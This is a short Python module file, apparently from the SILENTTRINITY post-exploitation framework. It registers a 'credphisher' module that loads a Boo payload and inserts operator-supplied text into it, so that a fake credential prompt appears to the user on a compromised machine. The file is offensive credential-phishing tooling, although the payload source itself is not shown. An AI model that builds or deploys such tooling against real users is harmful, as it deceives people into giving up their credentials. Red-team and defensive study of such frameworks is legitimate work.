from silenttrinity.core.utils import get_path_in_package
from silenttrinity.core.teamserver.module import Module


class STModule(Module):
    def __init__(self):
        self.name = 'boo/credphisher'
        self.language = 'boo'
        self.description = 'Prompts the current user for their credentials, message text to show the user can be customized.'
        self.author = '@matterpreter (Original C# Version), @byt3bl33d3r (Boolang port)'
        self.references = []
        self.options = {
            'MessageText': {
                'Description'   :   'Message text to show the user in the credential prompt',
                'Required'      :   True,
                'Value'         :   ""
            }
        }

    def payload(self):
        with open(get_path_in_package('core/teamserver/modules/boo/src/credphisher.boo')) as module_src:
            src = module_src.read()
            src = src.replace('MESSAGE_GOES_HERE', self.options['MessageText']['Value'])
            return src
